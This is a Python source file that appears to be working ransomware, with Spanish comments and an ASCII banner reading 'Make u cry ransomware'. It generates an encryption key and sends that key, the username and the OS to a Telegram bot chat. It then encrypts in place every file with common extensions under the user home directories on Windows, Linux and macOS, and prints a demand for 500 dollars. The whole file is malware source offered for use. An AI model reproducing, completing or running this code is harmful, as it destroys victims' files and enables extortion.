from cryptography.fernet import Fernet
import os
import platform
import requests
from sys import stdout
from time import sleep
from datetime import datetime
from tkinter import messagebox

Windows_dir = 'C:\\Users\\'
Linux_dir = '/home/'
llave = Fernet.generate_key()

Banner ='''

    ███▄ ▄███▓ ▄▄▄       ██ ▄█▀▓█████     █    ██     ▄████▄   ██▀███ ▓██   ██▓                  
▓██▒▀█▀ ██▒▒████▄     ██▄█▒ ▓█   ▀     ██  ▓██▒   ▒██▀ ▀█  ▓██ ▒ ██▒▒██  ██▒                  
▓██    ▓██░▒██  ▀█▄  ▓███▄░ ▒███      ▓██  ▒██░   ▒▓█    ▄ ▓██ ░▄█ ▒ ▒██ ██░                  
▒██    ▒██ ░██▄▄▄▄██ ▓██ █▄ ▒▓█  ▄    ▓▓█  ░██░   ▒▓▓▄ ▄██▒▒██▀▀█▄   ░ ▐██▓░                  
▒██▒   ░██▒ ▓█   ▓██▒▒██▒ █▄░▒████▒   ▒▒█████▓    ▒ ▓███▀ ░░██▓ ▒██▒ ░ ██▒▓░                  
░ ▒░   ░  ░ ▒▒   ▓▒█░▒ ▒▒ ▓▒░░ ▒░ ░   ░▒▓▒ ▒ ▒    ░ ░▒ ▒  ░░ ▒▓ ░▒▓░  ██▒▒▒                   
░  ░      ░  ▒   ▒▒ ░░ ░▒ ▒░ ░ ░  ░   ░░▒░ ░ ░      ░  ▒     ░▒ ░ ▒░▓██ ░▒░                   
░      ░     ░   ▒   ░ ░░ ░    ░       ░░░ ░ ░    ░          ░░   ░ ▒ ▒ ░░                    
       ░         ░  ░░  ░      ░  ░      ░        ░ ░         ░     ░ ░                       
                                                  ░                 ░ ░                       
 ██▀███   ▄▄▄       ███▄ ▄███▓  ██████  ▒█████   ███▄    █  █     █░ ▄▄▄       ██▀███  ▓█████ 
▓██ ▒ ██▒▒████▄    ▓██▒▀█▀ ██▒▒██    ▒ ▒██▒  ██▒ ██ ▀█   █ ▓█░ █ ░█░▒████▄    ▓██ ▒ ██▒▓█   ▀ 
▓██ ░▄█ ▒▒██  ▀█▄  ▓██    ▓██░░ ▓██▄   ▒██░  ██▒▓██  ▀█ ██▒▒█░ █ ░█ ▒██  ▀█▄  ▓██ ░▄█ ▒▒███   
▒██▀▀█▄  ░██▄▄▄▄██ ▒██    ▒██   ▒   ██▒▒██   ██░▓██▒  ▐▌██▒░█░ █ ░█ ░██▄▄▄▄██ ▒██▀▀█▄  ▒▓█  ▄ 
░██▓ ▒██▒ ▓█   ▓██▒▒██▒   ░██▒▒██████▒▒░ ████▓▒░▒██░   ▓██░░░██▒██▓  ▓█   ▓██▒░██▓ ▒██▒░▒████▒
░ ▒▓ ░▒▓░ ▒▒   ▓▒█░░ ▒░   ░  ░▒ ▒▓▒ ▒ ░░ ▒░▒░▒░ ░ ▒░   ▒ ▒ ░ ▓░▒ ▒   ▒▒   ▓▒█░░ ▒▓ ░▒▓░░░ ▒░ ░
  ░▒ ░ ▒░  ▒   ▒▒ ░░  ░      ░░ ░▒  ░ ░  ░ ▒ ▒░ ░ ░░   ░ ▒░  ▒ ░ ░    ▒   ▒▒ ░  ░▒ ░ ▒░ ░ ░  ░
  ░░   ░   ░   ▒   ░      ░   ░  ░  ░  ░ ░ ░ ▒     ░   ░ ░   ░   ░    ░   ▒     ░░   ░    ░   
   ░           ░  ░       ░         ░      ░ ░           ░     ░          ░  ░   ░        ░  ░
   
   '''

def dir_finder(dir_inicio):#generador que pasa la direccion completa de los archivos que encuentra
    extensiones = 'rar','php','jpg','png','mp3','mp4','zip','rar','cs','webp','txt','docx','bat','iso','gif','jpeg','psd','pdf','sh','bin','php','dll','exe','pptx','xml','xlsx','html','js'
    
    for dirpath, dirs, files in os.walk(dir_inicio):            
            for i in files:
                absolute_dir = os.path.abspath(os.path.join(dirpath, i))
                ext = absolute_dir.split('.')[-1]
                if ext in extensiones:
                    yield absolute_dir

def crypt(): 
    plataforma = platform.system() 
     
    #identifica el sistema operativo y asigna el directorio que el corresponde 
    if (plataforma == 'Windows'):
        x = dir_finder(Windows_dir)
    elif (plataforma == 'Linux' or plataforma == 'Darwin'):
        x = dir_finder(Linux_dir)
    else:
        messagebox.showerror(title='Error de compatibilidad',message='Te me salvaste... digo\nTu host no es compatible con este amigable programa')
        exit

    e = Fernet(llave)

    
    for i in x:
        sleep(0.2)
        print(f'Encrypting --> {i}')
        with open(i, 'rb') as file:#abre el archivo en modo leectura
            file_data = file.read()# lee su contenido
        crypted = e.encrypt(file_data)#encripta el contenido del archivo que esta cargado en el buffer
        with open(i, 'wb') as file:#abre el archivo en modo escritura
            file.write(crypted)#escribe en el archivo el contenido encriptado
    
def Key_send():#Envia la llave a un grupo de telegram
    #API DE TELEGRAM CON EL TOKEN DEL BOT --> https://api.telegram.org/{token de tu bot}/getupdates#
    
    user = os.getlogin()
    plataforma = platform.system() 
    fecha = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    id = '-779965945' #Id del chat objetivo
    token = "tokem de tu bot" #token de MI bot
    message  = f'''||||||||||||JACKPOT||||||||||||||\nos ---> {plataforma}|\nUsername ---> {user}|\nPasswd--> {llave}|\n Time ---> {fecha}|'''
    url = f'https://api.telegram.org/bot{token}/sendMessage?chat_id={id}&text={message}'
    
    requests.post(url) #ejecucion de la peticion http a la api de telegram con una url que bot debe usar
    #a que chat debe enviar el mensaje y contiene el mensaje a enviar

def red():
    RED = "\033[1;31m"
    stdout.write(RED)

def green():
    GREEN = "\033[0;32m"
    stdout.write(GREEN)

if llave == llave:
    red()
    print(Banner)
    Key_send()
    crypt()
    print(Banner)
    print('Tus archivos han sido encriptados por Mr. P0t4t0\nPara recuperacion deberas pagar 500 dolares\n')
